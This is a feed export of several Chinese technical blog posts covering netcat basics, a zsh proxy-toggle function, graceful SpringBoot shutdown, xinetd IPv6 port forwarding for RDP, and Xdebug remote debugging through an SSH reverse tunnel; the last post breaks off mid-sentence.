水很深，原因听我细细说来 netcat 被成为 TCP/IP 的瑞士军刀，得益于它虽体积小（几十KB）却在网络下无比强大，在各种场景下都有它发挥的余地，以至于在各大 Linux 发行版 中都默认安装。 原版的 netcat 第一版在 1995年10月28日 被发布，且最后一个版本 1.10 发布于 1996年3月，被称之为 tranditional netcat。 随后，为了兼容 POSIX，推出了不同实现的版本，最有名的为 OpenBSD netcat 和 GNU netcat： OpenBSD 版本的支持 IPv6 和 TLS GNU 版本的支持 -e 参数，可以在建立连接后执行命令 很有意思的是： 大部分的 Linux 发行版，以及 macOS / FreeBSD，预装的都是 OpenBSD netcat，如果要使用 GNU 版的，得自行从包管理器安装。 Windows 上只有 GNU netcat 水很深 的原因就在于，如果只用 netcat 进行端口转发，必须用到 GNU 版本的 -e 参数，所以就临时更改一下本文题材，讲解一下 netcat 的使用以及案例，且主要针对 OpenBSD netcat。 使用 我们先调用 nc -h 来看一下：1234567891011121314151617181920212223242526272829303132333435363738394041424344$ nc -hOpenBSD netcat (Debian patchlevel 1)usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port] Command Summary: -4 Use IPv4 -6 Use IPv6 -b Allow broadcast -C Send CRLF as line-ending -D Enable the debug socket option -d Detach from stdin -F Pass socket fd -h This help text -I length TCP receive buffer length -i interval Delay interval for lines sent, ports scanned -k Keep inbound sockets open for multiple connects -l Listen mode, for inbound connects -M ttl Outgoing TTL &#x2F; Hop Limit -m minttl Minimum incoming TTL &#x2F; Hop Limit -N Shutdown the network socket after EOF on stdin -n Suppress name&#x2F;port resolutions -O length TCP send buffer length -P proxyuser Username for proxy authentication -p port Specify local port for remote connects -q secs quit after EOF on stdin and delay of secs -r Randomize remote ports -S Enable the TCP MD5 signature option -s sourceaddr Local source address -T keyword TOS value -t Answer TELNET negotiation -U Use UNIX domain socket -u UDP mode -V rtable Specify alternate routing table -v Verbose -W recvlimit Terminate after receiving a number of packets -w timeout Timeout for connects and final net reads -X proto Proxy protocol: &quot;4&quot;, &quot;5&quot; (SOCKS) or &quot;connect&quot; -x addr[:port] Specify proxy address and port -Z DCCP mode -z Zero-I&#x2F;O mode [used for scanning] Port numbers can be individual or ranges: lo-hi [inclusive] 我们挑几个常用的参数解释一下： -4 允许 IPv4（默认允许） -6 允许 IPv6 -k keep-alive，上一个socket结束后仍可以重新建立socket再次被连接 -p 本地端口 -l 监听模式，在 OpenBSD 版下可省略 -p，即 “-l 8080“ 等同于 GNU 版的 “-l -p 8080“ -q 在接收到 EOF 后等待预设的秒数，然后断开连接 -U 使用 Unix Socket -u 使用 UDP 模式 -v 输出详细信息（GNU 版有 -vv 模式，可输出更详细的信息） -w 预设连接超时时间 -z 表示不发送数据 案例大部分的案例，笔者都录制了终端的 GIF 动图： tmux 会话左侧为本地 macOS，IP为 192.168.1.100 tmux 会话右侧为远端 Linux，IP为 192.168.1.39 一次性聊天室 远端执行 nc -l 1234 -4 -6 开启 -4 和 -6 参数，既监听 IPv4 又监听 IPv6（可省略 -4） 连接成功后，两边均可键入字符，然后按下回车键发送给对方 本地使用 CTRL-D 关闭连接，因默认为 TCP 模式，远端也会默认退出 伪常驻 聊天室 远端执行 while true; do nc -l 1234; done，使得连接一旦结束，远端会再次发起监听 UDP 聊天室 远端执行 nc -l 1234 -u，本地也需要加 -u 参数才能连接 与 TCP连接 有开始有结束不同，UDP 模式并没有 关闭连接 之说，所以 CTRL-D 无效，只能在两端分别用 CTRL-C 结束进程 默认情况下，远端处理完一次连接后，并不会再次监听新的请求，所以加上 -k 参数，可以维活处理多次连接 发起 HTTP 请求（交互式） 远端执行 python3 -m simple.http 9876，在 9876 端口开启一个文件 Web 服务器 本地执行 nc 192.168.1.39 9876，连接上远端的 Web 服务器 交互式的输入 GET / 或者 GET / HTTP/1.0 后，连按两下 回车键，即可发送 HTTP 请求，并收到远端的请求响应 发起 HTTP 请求（命令式） 本地执行 echo -n &quot;GET / HTTP/1.0\\r\\n\\r\\n&quot; | nc 192.168.1.39 9876（注：GET / HTTP/1.0\\r\\n\\r\\n 可缩写为 GET /\\r\\n\\r\\n） 上则案例中的 “连按两下 回车键“，就是模拟的 “连续两个 \\r\\n“ 文件传输（简单） 远端先执行 nc -l 1234 &gt; received_file，开启监听，如果建立连接且有字节流入，就会输出到文件 received_file 本地再执行 nc 192.168.1.39 1234 &lt; iTerm2.zip，将文件 iTerm2.zip 传输过去 用 file 和 ls -al 命令查看一下两边文件是否一致 文件传输（使用 tar 归档传输多文件） 远端先执行 tar cvf - text1.txt text2.txt | nc -l 1234 -q 1，先使用 tar 归档多个文件，并使用管道流向 netcat 并开启监听 本地再执行 nc 192.168.1.39 1234 | tar xvf -，建立连接后读入字节流，由管道流向 tar 后解压出原多文件 -q 1 表示传输完毕后，等待1s后退出，如果是 -q 0 则可用 -N 来代替 socket通信 本地先执行 nc -lU /tmp/socket，使用 -U 参数使用并创建套接字文件 本地新终端 echo &quot;hhh&quot; | nc -U /tmp/socket，将字符串 “hhh” 写入套接字文件，则在原终端会从套接字文件中读出 “hhh” 字符串 网络测速（配合 dd 使用） 远端先执行 nc -vl 1234 &gt; /dev/null，表示读入的字节流直接写入 /dev/null 文件，这么做的目的是排除真正文件读写的磁盘速度上限干扰 本地再执行 dd if=/dev/zero bs=1024 count=102400 | nc -vn 192.168.1.39 1234，从 /dev/zero 中不断生成字节流，每个区块1024个字节，以供102400个区块，总计 100MB，最后 dd 报告得出，网络速率为 7630165 KB/s，即 7.6 MB/s（测试速度慢是因为远端 Linux 是树莓派，通过 2.4GHz Wi-Fi 接入局域网） 服务端口诊断案例背景：公司的 Elastic Search 服务器集群部署在阿里云，其 9200/9300 端口的防火墙直接采用阿里云的安全组配置，内网IP和公司所在的公网IP才可以访问。 本地开发环境如果发现 Elastic Search 连接报错，我们会采用 telnet es.example.com 9200 来作第一步诊断： 如果 telnet 能连接成功，则表示本地开发环境出了问题123Trying 120.27.216.xxx...Connected to es.example.com.Escape character is &#39;^]&#39;. 如果 telnet 无法连接，则表示可能因为公司IP变化后无法命中阿里云安全组白名单所致12Trying 120.27.216.xxx...telnet: Unable to connect to remote host: Connection refused 其实可以不用 telnet，而且 telnet 在 macOS 环境中并没有预装，我们可以改用 nc -vz es.example.com 9200 来替代 端口能访问1Connection to es0.example.com (120.27.216.xxx) 9200 port [tcp&#x2F;wap-wsp] succeeded! 端口无法访问1nc: connect to es0.example.com (120.27.216.xxx) port 9200 (tcp) failed: Connection refused 写在最后本文演示了一些 OpenBSD netcat 的案例，其实用管道配合其他工具，还能出很多很多的案例，但是吸收了上面的几个案例之后，通过举一反三，相信读者也能深谙 netcat 的强大。 后面笔者会以 GNU netcat 为重点写个 篇二，因其存在 -e 参数，所以其部分内容单独拎出来也可以作为 端口转发(篇三) - GNU netcat 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"TCP/IP","slug":"TCP-IP","permalink":"https://blog.chaosjohn.com/tags/TCP-IP/"},{"name":"netcat","slug":"netcat","permalink":"https://blog.chaosjohn.com/tags/netcat/"}]},{"title":"命令行下快捷开关代理","slug":"ProxySwitch-for-Command-Line","date":"2020-12-09T09:36:41.000Z","updated":"2020-12-10T07:58:59.036Z","comments":true,"path":"ProxySwitch-for-Command-Line.html","link":"","permalink":"https://blog.chaosjohn.com/ProxySwitch-for-Command-Line.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言笔者经常会遇到在命令行下不得不走代理的情况： Homebrew &amp; Cask（特别是后者，不走代理的话速度简直感人） 从 Github 执行各种操作（clone / pull / push / fetch） 旧方案笔者在本地的 1080 端口搭建了 socks5 代理开启代理： 1export all_proxy&#x3D;socks5:&#x2F;&#x2F;localhost:1080 &amp;&amp; export ALL_PROXY&#x3D;$all_proxy 有时候要用到局域网的另外一台电脑上搭建的代理，还得将 localhost 改为那台电脑的IP。 虽然 zsh 可以通过键入前几个字母比如 export all_ 然后通过 方向上健 快速定位到之间的历史，然后向左移动光标，删去 localhost，重新输入新的 IP，但是笔者还是嫌麻烦，所以动了造轮子的心思。 新方案因为笔者采用的是 zsh，所以在 $HOME/.zshrc 内添加以下函数 1234567891011121314151617181920function socks5on() &#123; _PORT&#x3D;&quot;1080&quot; _HOST&#x3D;&quot;127.0.0.1&quot; if [ $# &#x3D; 0 ]; then elif [ $# &#x3D; 1 ]; then _PORT&#x3D;$1 elif [ $# &#x3D; 2 ]; then _HOST&#x3D;$1 _PORT&#x3D;$2 fi export all_proxy&#x3D;socks5:&#x2F;&#x2F;$&#123;_HOST&#125;:$&#123;_PORT&#125; export ALL_PROXY&#x3D;$all_proxy echo $ALL_PROXY&#125;function socks5off() &#123; unset all_proxy unset ALL_PROXY&#125; 函数 socks5on 的用法： $ socks5on 设置代理为 socks5://127.0.0.1:1080 $ socks5on 1081 设置代理为 socks5://127.0.0.1:1081 $ socks5on 192.168.0.253 1080 设置代理为 socks5://192.168.0.253:1080 函数 socks5off 的用法： $ socks5off 取消代理设置 注意： socks5on 函数里，笔者变量取名 _HOST 而不是 HOST，是因为 $HOST 默认存放系统主机名称。 all_proxy 和 ALL_PROXY 同时都设置，是因为，有的程序读取 $all_proxy，有的程序读取 $ALL_PROXY。 读者可以拿去自行更改食用哈。 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"},{"name":"proxy","slug":"proxy","permalink":"https://blog.chaosjohn.com/tags/proxy/"},{"name":"zsh","slug":"zsh","permalink":"https://blog.chaosjohn.com/tags/zsh/"}]},{"title":"SpringBoot 优雅退出","slug":"SpringBoot-exit-gracefully","date":"2020-12-08T15:11:54.000Z","updated":"2020-12-08T16:17:07.272Z","comments":true,"path":"SpringBoot-exit-gracefully.html","link":"","permalink":"https://blog.chaosjohn.com/SpringBoot-exit-gracefully.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 背景公司某项目的后端技术栈采用的是 SpringBoot + Kotlin，具体细节本文不作展开。 业务中，用户在我们平台上购买产品，我们通过实时请求供应商的交易API，在商户余额（即我们在供应商那边的储值）里扣除对应的金额后，才会将产品的“源文件”返回，进而交付给用户。 项目迭代中我们需要不断的部署新的版本上线，最初的做法很暴力，构建新的 flatjar 运行起来，然后直接结束掉 旧的 java 进程。 然后就发现问题了：某次购买行为中，交易API的请求发送出去了，还没等待请求返回，进程就被杀死了，造成储值余额被扣了，但是“源文件”并没有拿到，而供应商的API又存在延迟，即交易API处理成功，但是通过订单查询API却查不到。 所以，如何才能在 java 进程被杀死的时候，做完 善后工作 再退出呢？ 解决一般我们杀死进程，都是给进程发送信号 Signal： SIGINT SIGTERM 这里我们用到两个类： sun.misc.Signal，代表信号 sun.misc.SignalHandler，用来处理进程接收到的信号 同时，我们设计以下全局变量： var killSignalReceived = false // 用来表示是否接收到终止信号 val jobSet = mutableSetOf&lt;String&gt;() // 表示需要在结束之前等待完成的任务 所以交易API的请求处理，我们将改成： 123456789if (!killSignalReceived) &#123; &#x2F;&#x2F; 只有为 &#96;false&#96;，才进行交易处理 synchronized(jobSet) &#123; jobSet.add(jobTitle) &#x2F;&#x2F; 处理之前，将当前处理任务存入 &#96;jobSet&#96; &#125; &#x2F;&#x2F; Todo: 具体实现请求交易API的处理 synchronized(jobSet) &#123; jobSet.remove(jobTitle) &#x2F;&#x2F; 处理结束，将当前处理任务从 &#96;jobSet&#96; 中移除 &#125;&#125; 在程序主函数中，新增： 1234567891011val killHandler &#x3D; SignalHandler &#123; logger.error(&quot;intercept signal of $&#123;it.toJson()&#125;&quot;) killSignalReceived &#x3D; true while (jobSet.isNotEmpty()) &#123; logger.error(&quot;Background Jobs: \\n\\t\\t&quot; + jobSet.joinToString(&quot;\\n\\t\\t&quot;) + &quot;\\n&quot;) Thread.sleep(1000) &#125; exitProcess(0)&#125;Signal.handle(Signal(&quot;INT&quot;), killHandler)Signal.handle(Signal(&quot;TERM&quot;), killHandler) 当 java 进程接收到 SIGINT 和 SIGTERM 信号后： 将 killSignalReceived 置为 true 循环检查 jobSet 是否为空 不为空，打印当前未结束的任务列表，等待1s后再次检查 为空，程序退出 如果需要忽略 善后工作 强行退出，给进程发送 SIGKILL 即可： kill -KILL pid kill -9 pid 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"jvm","slug":"jvm","permalink":"https://blog.chaosjohn.com/tags/jvm/"},{"name":"java","slug":"java","permalink":"https://blog.chaosjohn.com/tags/java/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://blog.chaosjohn.com/tags/SpringBoot/"},{"name":"kotlin","slug":"kotlin","permalink":"https://blog.chaosjohn.com/tags/kotlin/"}]},{"title":"端口转发(篇二) - xinetd","slug":"Port-Forwarding-2","date":"2020-12-07T07:50:23.000Z","updated":"2020-12-07T14:52:17.316Z","comments":true,"path":"Port-Forwarding-2.html","link":"","permalink":"https://blog.chaosjohn.com/Port-Forwarding-2.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 这是 端口转发 系列文章的第二篇，历史文章： 端口转发(篇一) - rinetd 前言笔者之前也过一篇文 - IPv6在虚拟机通过无线网卡桥接的网络下无法使用(VMware WorkStation) 文中背景：笔者买了一台 GK41，运行的是随机安装的 Windows 10，同时借助 VMware Workstation 运行了一台虚拟客户机 Manjaro Linux。GK41 通过 RJ45 网口接入网络，虚拟机采用 桥接 该网口的有线网卡，给客户机 Manjaro Linux 提供网络接入。至此，主机和客户机都处于同一个局域网内，且都能分配到IPv4/IPv6，此时 GK41：192.168.0.41 Manjaro Linux：192.168.0.65 诉求因为笔者不给 GK41 接显示器，但又想通过 IPv6 远程访问 Windows 10 的桌面，结合笔者之前造过 crontab + ddns6 的轮子，所以打算： Manjaro Linux 配置为开机自启 Manjaro Linux 上配置 ddns6，通过 cron 定时检测并更新自身的 IPv6地址 到域名 manjaro-gk41.example.com Manjaro Linux 转发自己的 3389 端口到 Windows 10 的 3389 端口 3389 端口是 RDP(Remote Desktop Protocal)（微软远程桌面协议） 的默认端口 发现问题最直接的想到了 篇一 中的工具 - rinetd 然后就是 一顿操作猛如虎，试完发现不靠谱 因为 rinetd 不支持 IPv6，它只监听 IPv4地址 和转发到 IPv4地址，详见 rinetd 在其 Github 上的某 Issue - does the program support ipv6?。 老爷子回复道：可能不会支持 IPv6 了，因为这玩意自从上世纪九十年代开始，我就没怎么动过了，添加 IPv6 支持估计会很难。 解决问题在寻找 rinetd 替代品的过程中，笔者发现了 xinetd xinetd 和 rinetd 都是 inetd(&quot;the Internet daemon&quot;) 的替代品。不过 inetd 最早跟随 4.3BSD（1986年）推出，在如今的 主流 Linux 发行版 中都已经被弃用了；而 rinetd 虽然在各大包管理器中均能找到，但它的作者也说了，自从上个世纪九十年代之后就没怎么动过了；对于 xinetd，虽然最后一个版本 2.3.15 发布于 2012年5月9日，但Github主页上最近一次更新还在2016年。 xinetd 在 2.1.8.8pre* 版本（早于2000年6月4号），就增加了 IPv6 支持，太超前太牛逼了，详见互联网档案馆 2000-08-16 快照 和 互联网档案馆 2013-06-07 快照（因官网 http://www.xinetd.org 早已不可访问，所以只能在 互联网档案馆 里找到 2000-08-16 ~ 2013-06-09 之间的网页快照） 安装 Manjaro Linux / Arch Linux 1$ sudo pacman -S xinetd Debian / Ubuntu12$ sudo apt update$ sudo apt install xinetd RHEL / CentOS12$ sudo yum update$ sudo yum install xinetd FreeBSD12$ sudo pkg update$ sudo pkg install xinetd 配置配置文件默认位于 /etc/xinetd.d 目录下，且安装完会默认创建一些常用的配置（默认均为禁用状态：disable = yes） 12345678910$ ls -lh &#x2F;etc&#x2F;xinetd.d-rw-r--r-- 1 root root 306 Nov 14 2019 rlogin-rw-r--r-- 1 root root 303 Nov 14 2019 rsh-rw-r--r-- 1 root root 315 Aug 8 03:49 rsync-rw-r--r-- 1 root root 205 Sep 5 17:34 sane-rw-r--r-- 1 root root 253 Nov 13 2019 servers-rw-r--r-- 1 root root 254 Nov 13 2019 services-rw-r--r-- 1 root root 157 Nov 14 2019 talk-rw-r--r-- 1 root root 160 Nov 14 2019 telnet-rw-r--r-- 1 root root 158 Sep 6 23:32 tftp 针对我的诉求，创建配置文件 1234567891011121314# cat &gt;&gt; &#x2F;etc&#x2F;xinetd.d&#x2F;win10-gk41 &lt;&lt;EOFservice services&#123; flags &#x3D; IPv6 disable &#x3D; no type &#x3D; UNLISTED socket_type &#x3D; stream protocol &#x3D; tcp user &#x3D; nobody wait &#x3D; no redirect &#x3D; 192.168.0.41 3389 port &#x3D; 3389&#125;EOF 该配置表示，监听本地网卡 IPv6地址 的 3389 端口，然后转发到 192.168.0.41:3389 然后重启 xinetd 生效，在 微软远程桌面 里通过访问 manjaro-gk41.example.com 即可访问到 gk41 上运行的 Windows 10。 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.chaosjohn.com/tags/network/"},{"name":"tool","slug":"tool","permalink":"https://blog.chaosjohn.com/tags/tool/"},{"name":"port-forwarding","slug":"port-forwarding","permalink":"https://blog.chaosjohn.com/tags/port-forwarding/"}]},{"title":"php 调试指南（Xdebug版）（续）","slug":"Debug-php-continued","date":"2020-12-05T08:04:14.000Z","updated":"2020-12-07T01:47:17.445Z","comments":true,"path":"Debug-php-continued.html","link":"","permalink":"https://blog.chaosjohn.com/Debug-php-continued.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言在前文 php 调试指南（Xdebug版） 开头，笔者吹了一句 ”吃透本文，没有人将比你更懂 Php Xdebug 调试“。没想到打脸来的如此之快，这才过了三四天，我发现今天的我比写前文时的我，更懂 了。 关于 PhpStorm 2020.3 和 Xdebug 3在前文中，笔者用的还是 PhpStorm 2020.2.4，所以结合 Xdebug 3.0.0 在使用 Web Server Debug Validation 进行 调试环境验证 时，提示类似 Xdebug port is invalid 的报错，分析是 不兼容 3.0.0 版本 导致的。所以降级成了 Xdebug 2.9.8 才顺利写完了文章。 写完前文的第二天，PhpStorm 2020.3就发布了，新增 对 PHP 8 的支持 对 Xdebug 3 的支持 在重新用 PHPBrew 安装 PHP 8 + Xdebug 3.0.0 环境并且用 Nginx + php-fpm 部署起来后，Web Server Debug Validation 成功验证。 关于 Web Server Debug Validation 功能笔者在前文写完后，在升级 PhpStorm 2020.3 之前，笔者重新安装了 PHP 7.4.13 + Xdebug 3.0.0 环境，在忽略 验证报错 的情况下直接开启调试，是完全没有任何问题的。所以，该功能只是 验证调试环境，在调试之前仅作参考，不影响实际调试。 关于 远程调试笔者在写前文关于 远程调试 的几节时，参考了网上很多文章，看似吃透了，其实不然，原因有这样几点： 网上很多文章的作者写文时也如同笔者写前文时一样，对原理一知半解，导致很多讲解其实不完善或者南辕北辙。正确的做法：研读 JetBrains / VSCode / Xdebug 的官方文档，去理解它的原理。 Configure Xdebug—PhpStorm PhpStorm官方：配置 Xdebug Remote debugging via SSH tunnel—PhpStorm PhpStorm官方：通过SSH隧道进行远程调试 Multiuser debugging via Xdebug proxies—PhpStorm PhpStorm官方：通过 Xdebug 代理进行多人调试 PHP Debug Adapter for Visual Studio Code VSCode PHP Debug 插件主页文档 Step Debugging Xdeubg官方：单步调试 Documentation - all settings Xdebug官方：所有配置项 Upgrading from Xdebug 2 to 3 Xdebug官方：从Xdebug 2 升级到 Xdebug 3 笔者写前文时搭建的 远程调试环境 不完善 本机 和 远程服务器 都是 macOS 本机 和 远程服务器 都在 局域网内 IDE 结合 Xdebug 调试的原理 IDE（本身或利用插件） 打开本地的 9000 端口并进行监听（Xdebug 2.X 默认为 9000，Xdebug 3.X 默认为 9003，但均可修改） IDE（本身或利用插件） 做好路径映射（path mapping），即本地在IDE中打开的项目目录与远程服务器上的项目目录做一一映射，例如 macOS 本地：/Users/chaos/Work/php/demos/debug/ Linux 服务器：/home/chaos/Work/php/demos/debug/ 本地向服务器发送请求时带上 Cookie: XDEBUG_SESSION=IDEKEY 服务器接受到请求时，经历了 Nginx -&gt; php-fpm 后到达 Xdebug，Xdebug 检测到 XDEBUG_SESSION 的 cookie，认为这条请求是带着 调试目的 来的，同时挂起 PHP解释器 进一步处理请求 然后 Xdebug 从 php.ini 中获取目标地址或从 $_SERVER 里获取到请求的来源地址（比如 223.104.148.182）作为目标地址，然后就向目标地址的 9000 端口发起建立 调试连接 本地的 IDE（本身或利用插件） 发现监听的 9000 端口有 调试连接 建立，判断一下 XDEBUG_SESSION 是否为自己预设的 IDE key 如果不是预设 IDE key，通过 9000 端口上的 调试连接 告诉服务器的 Xdebug，“不归我管，我不处理”，然后双方协商一下断连接 如果是预设 IDE key，同时发现本地打了断点或者本地设置了 &quot;stopOnEntry&quot;: true (VSCode) / Break at first line in PHP scripts (PhpStorm)，则告诉服务器的 Xdebug，“收到，调试准备就绪”，然后双方协商一下进入调试状态 真实环境下 远程调试 的 陷阱聪明的小伙伴可能已经发现上述 调试流程 里存在的一个 陷阱：即服务器要向本地请求建立 调试连接，但问题是，现在所有的 家用/企业 网络环境下，所谓的 本地 都在上级路由器的 NAT 下，根本就没有暴露在公网的 IP地址，所以 本地 的 9000 端口对于服务器来说，是不可达的，想要访问，做梦！ 填坑 陷阱笔者重新模拟了真实的调试环境，即 本地 为 macOS，远程服务器 选了两台 Linux，一台是笔者在公司搭建的 物理机，另一台是公司购买的阿里云 云主机。 填坑的最终目的，是要使得 本地 的 9000 端口暴露给服务器，让其直接可达。 这里分： 本地和远程服务器同处一个局域网内，例如，都加入同一个 VPN 网络，本地通过 VPN 分配给服务器的 私网IP 访问服务器，服务器的 Xdebug 解析到的来源地址则也是通过 VPN 分配给本地的 私网IP，直接可达。 路由器本身从 ISP（宽带运营商） 通过 PPPoE 拨号 获取到了 公网IP，然后路由器上通过 端口映射 或 DMZ 模式，将本地的 9000 端口，映射到路由器的 9000 端口，这样服务器也可通过 公网IP:9000 访问到本地的 9000 端口。（该方式最推荐，但是在国内可行度不高，因为国内 IP地址池 即将枯竭，所以很难从运营商处申请到 公网IP） 其他环境只能借助 移花接木大法：借助 SSH 反向隧道，在本地和服务器之间建立一条 TCP通道，将本地的 9000 端口映射到服务器的 9000 端口。这样的话，服务器上的 Xdebug 访问 localhost:9000 就等于访问到了 IDE本地 的 9000 端口。（借用 JetBrains 官方文档里的一副插图） 在这里，笔者将前两种环境归纳为 回程网络直接可达，否则则为 回程网络不可直达。 PhpStorm 的特殊配置在分别罗列远程调试的具体参数配置之前，笔者还得额外将 PhpStorm 的特殊配置单独拎出来阐述一下。 PhpStorm 调试的 目标服务器，以 Server 的存在进行配置，具体位于 偏好设置 的 Languages and Frameworks | PHP | Servers 下。详见 JetBrains 官方文档，原文是这样的： On this page, configure HTTP access for debugging engines to interact with local and remote Web servers and set correspondence between files on the server and their local copies in the PhpStorm project. 在本页，为调试配置 HTTP 访问，用以在 本地 和 远程 Web 服务器 之间交互，以及为 远程服务器的文件 与其在 PhpStorm 工程 中打开的 本地拷贝 设置关联。 PhpStorm 调试的特殊配置：在远程服务器上的 php-fpm 配置文件里添加这两行： 12clear_env &#x3D; noenv[&quot;PHP_IDE_CONFIG&quot;] &#x3D; &quot;serverName&#x3D;UbuntuServer&quot; 这里 UbuntuServer 是自定义的服务器名称，自行更改。 然后在 PhpStorm 偏好设置的 Languages and Frameworks | PHP | Servers 添加一个 Server name 填 UbuntuServer Host 和 Port 笔者亲测可填任意合法值，PhpStorm 不校验，所以笔者都填写了 0 值 Debugger 选择 Xdebug 勾选上 Use path mappings，并且设置好 本地文件目录路径 和 服务器文件目录路径 的映射（比如笔者本地的 /Users/chaos/Work/php/demos/debug/ 与服务器的 /home/chaos/Work/php/demos/debug/） VSCode 的配置只需要比本地调试多配置一个 路径映射，即 pathMappings 键值对，附上 launch.json 文件内容： 1234567891011121314151617181920212223&#123; &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;Listen for XDebug&quot;, &quot;type&quot;: &quot;php&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;port&quot;: 9000, &#x2F;&#x2F; &quot;stopOnEntry&quot;: true, &quot;pathMappings&quot;: &#123; &quot;&#x2F;home&#x2F;chaos&#x2F;Work&#x2F;php&#x2F;demos&#x2F;debug&#x2F;&quot;: &quot;$&#123;workspaceRoot&#125;&#x2F;&quot;, &#125; &#125;, &#123; &quot;name&quot;: &quot;Launch currently open script&quot;, &quot;type&quot;: &quot;php&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;$&#123;file&#125;&quot;, &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;, &quot;port&quot;: 9000 &#125; ]&#125; 这里的 &quot;/home/chaos/Work/php/demos/debug/&quot;: &quot;$&#123;workspaceRoot&#125;/&quot; 是 &quot;/home/chaos/Work/php/demos/debug/&quot;: &quot;/Users/chaos/Work/php/demos/debug/&quot; 的简化形式，$&#123;workspaceRoot&#125; 则为 VSCode 中打开的 项目根目录。 服务器的 php.ini 在不同情况下的配置情况一：回程网络直接可达 Xdebug 2.X 123[xdebug]xdebug.remote_enable&#x3D;1xdebug.remote_connect_back&#x3D;1 | remote_enable=1 表示开启远程调试 | remote_connect_back=1 表示获取请求发起地址（从 $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] 和 $_SERVER[&#39;REMOTE_ADDR&#39;] 中获取），反向访问发起地址的 9000 端口建立调试连接 Xdebug 3.X 1234[xdebug]xdebug.mode&#x3D;debugxdebug.discover_client_host&#x3D;truexdebug.port&#x3D;9000 | mode=debug 取代了 2.X 版本的 remote_enable=1 | discover_client_host=true 取代了 2.X 版本的 xdebug.remote_connect_back=1 | port=9000 是个人喜好，在 3.X 中默认为 9003。笔者倾向于保持与 2.X 一致，这样同一份 IDE 配置可以同时调试 2.X 版本和 3.X 版本 情况二：回程网络不可直达先用 SSH 隧道 反向将本地的 9000 端口映射到服务器的 9000 端口上 1ssh -g -N -R 9000:127.0.0.1:9000 user@server Xdebug 2.X (Method A) 123[xdebug]xdebug.remote_enable&#x3D;1xdebug.remote_host&#x3D;127.0.0.1 | remote_host=127.0.0.1 表示直接向 127.0.0.1 这个地址请求建立调试连接 Xdebug 2.X (Method B) 1234[xdebug]xdebug.remote_enable&#x3D;1xdebug.remote_connect_back&#x3D;1xdebug.remote_addr_header&#x3D;&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; | remote_connect_back=1 表示获取请求发起地址，反向访问发起地址的 9000 端口建立调试连接 | xdebug.remote_addr_header=&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; 表示优先从 $_SERVER[‘HTTP_X_XDEBUG_REMOTE_ADDR’] 获取发起地址，获取不到再去 $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] 和 $_SERVER[&#39;REMOTE_ADDR&#39;] 中寻找 | 调试请求类似于 $ curl server.com:8000 -b XDEBUG_SESSION=IDEKEY -H &quot;X-Xdebug-Remote-Addr: 127.0.0.1&quot; | 注意：HTTP- 发送请求时不用添加，因为对于未自定义的 header，Nginx 会自动加上前缀 HTTP_，并全部大写，横线 转为 下划线，存入 $_SERVER 全局变量中 Xdebug 3.X (Method A) 1234[xdebug]xdebug.mode&#x3D;debugxdebug.port&#x3D;9000xdebug.client_host&#x3D;127.0.0.1 | client_host=127.0.0.1 表示直接告诉 Xdebug，发起地址就是 127.0.0.1，你往这个地址请求建立调试连接就可以了 Xdebug 3.X (Method B) 12345[xdebug]xdebug.mode&#x3D;debugxdebug.port&#x3D;9000xdebug.discover_client_host&#x3D;truexdebug.client_discovery_header&#x3D;&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; | client_discovery_header=&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; 取代了 2.X 版本的 xdebug.remote_addr_header=&quot;HTTP_X_XDEBUG_REMOTE_ADDR&quot; 其中 Xdebug 2.X (Method B) 与 Xdebug 3.X (Method B) 还有些许不同： Xdebug 2.X (Method B) 如果按配置规则没找到请求发起地址，它不会降级使用 127.0.0.1/localhost 作为请求发起地址 Xdebug 3.X (Method B) 如果按配置规则没找到请求发起地址，它会降级使用 127.0.0.1/localhost 作为请求发起地址 多人调试 - DBGp先附上参考文档 Multiuser debugging via Xdebug proxies PhpStorm官方：通过 DBGp 代理进行多人调试 DBGp Proxy Tool Xdebug官方 这块我不仅会略过，我还会狠狠的吐槽一下。先来看一下上述 “Multiuser debugging via Xdebug proxies” 这篇文里的一张插图 看似很美妙是不是，在笔者下载了 dbgpProxy 并且反复实验后，发现这个工具真的是神坑。 笔者在那台阿里云上运行 ./dbgpProxy -i 0.0.0.0:9001 -s 127.0.0.1:9000 后，从本地的 PhpStorm 带着自定义IDE key &quot;PS&quot; 发起调试请求，结果 dbgpProxy 日志打印 Connecting to 112.3.2.42:9000，而笔者所在的本地宽带并没有公网IP，112.3.2.42 这个IP是多层 NAT 之前的IP，肯定访问不进来，只能上 SSH 隧道方案。 那这个 dbgpProxy 的意义何在呢？笔者在网上找到了 Xdebug 的作者 Derick Rethans（他同时设计了 DBGp 协议）的一篇文章 - Debugging with multiple users，在文中，他描绘了 DBDp 的使用场景： Running a DBGp proxy also allows you to avoid NAT issues where (as seen from PHP+Xdebug on the server) all connections seem to come from the same IP (because your internal network is NATted). In this case, you can simple run the dbgp proxy on your NAT machine, configure 